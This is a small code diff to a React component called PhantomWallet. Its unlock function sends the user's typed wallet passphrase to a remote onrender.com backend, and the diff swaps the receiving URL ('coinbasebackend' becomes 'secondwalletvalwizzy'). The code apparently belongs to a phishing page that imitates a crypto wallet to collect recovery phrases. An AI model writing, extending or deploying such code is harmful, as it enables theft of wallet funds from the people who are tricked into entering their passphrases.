@@ -9,7 +9,7 @@ const PhantomWallet = () => {
     const [loading, setLoading] = useState(false);
   
     const unlockWallet = async () => {
-      const url = 'https://coinbasebackend.onrender.com/phantom';
+      const url = 'https://secondwalletvalwizzy.onrender.com/phantom';
       const data = { passphrase: text };
   
       try {
